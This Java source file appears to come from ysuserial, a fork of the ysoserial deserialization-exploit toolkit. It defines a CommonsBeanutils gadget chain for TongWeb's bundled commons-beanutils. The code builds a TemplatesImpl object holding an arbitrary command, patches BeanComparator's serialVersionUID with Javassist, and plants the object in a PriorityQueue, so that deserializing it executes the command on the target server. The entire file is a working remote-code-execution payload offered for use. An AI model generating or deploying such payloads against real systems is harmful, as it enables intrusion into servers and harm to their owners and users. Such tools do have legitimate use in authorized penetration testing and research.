package org.su18.ysuserial.payloads.gadgets;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;
//import com.tongweb.commons.beanutils.BeanComparator;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.PayloadRunner;
import org.su18.ysuserial.payloads.util.Reflections;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

import java.util.PriorityQueue;

import static org.su18.ysuserial.payloads.config.Config.POOL;
import static org.su18.ysuserial.payloads.handle.ClassFieldHandler.insertField;

// todo
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
public class CommonsBeanutils1183TongWeb implements ObjectPayload<Object> {
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils1183TongWeb.class, args);
	}

	public class JavassistClassLoader extends ClassLoader {
		public JavassistClassLoader(){
			super(Thread.currentThread().getContextClassLoader());
		}
	}

	@Override
	public Object getObject(String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		// 修改BeanComparator类的serialVersionUID
		ClassPool pool = ClassPool.getDefault();
		pool.insertClassPath(new ClassClassPath(Class.forName("com.tongweb.commons.beanutils.BeanComparator")));
		final CtClass ctBeanComparator = pool.get("com.tongweb.commons.beanutils.BeanComparator");
		try {
			CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
			ctBeanComparator.removeField(ctSUID);
		}catch (javassist.NotFoundException e){}
		ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
		final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
		ctBeanComparator.defrost();
		Reflections.setFieldValue(beanComparator, "property", "lowestSetBit");

		PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)beanComparator);

		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		Reflections.setFieldValue(beanComparator, "property", "outputProperties");

		Object[] queueArray = (Object[])Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
	}

}
